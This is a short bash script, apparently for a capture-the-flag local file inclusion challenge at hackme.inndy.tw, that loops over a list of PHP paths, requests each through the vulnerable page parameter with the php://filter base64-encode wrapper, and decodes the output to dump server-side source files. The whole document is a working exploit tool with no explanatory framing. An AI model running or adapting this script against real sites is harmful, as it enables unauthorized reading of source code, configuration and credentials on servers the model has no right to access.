#!/bin/bash
# ./lfi.sh php-list.txt "https://hackme.inndy.tw/lfi/index.php?page="

phpfile_table=$(cat $1)
url=$2
out="out"
encoded="encoded"
decoded="decoded"
base64_filter=10

mkdir $out $out/$encoded $out/$decoded
for file in $phpfile_table; do
  echo $filesave_name
  filesave_name=$(echo $file|sed 's/\//_/g')
  download_file=$out/$filesave_name
  base64_only=$out/$encoded/$filesave_name
  base64_decode=$out/$decoded/$filesave_name
  curl "$url""php://filter/read=convert.base64-encode/resource=$file" -o $download_file
  awk_arg='{if (length($0) > '$base64_filter' && length($0) % 4 == 0 ) print $0}'
  egrep -o '[A-Za-z0-9+\/]+={0,2}' $download_file| awk "$awk_arg" > $base64_only
  base64 -d $base64_only > $base64_decode
done

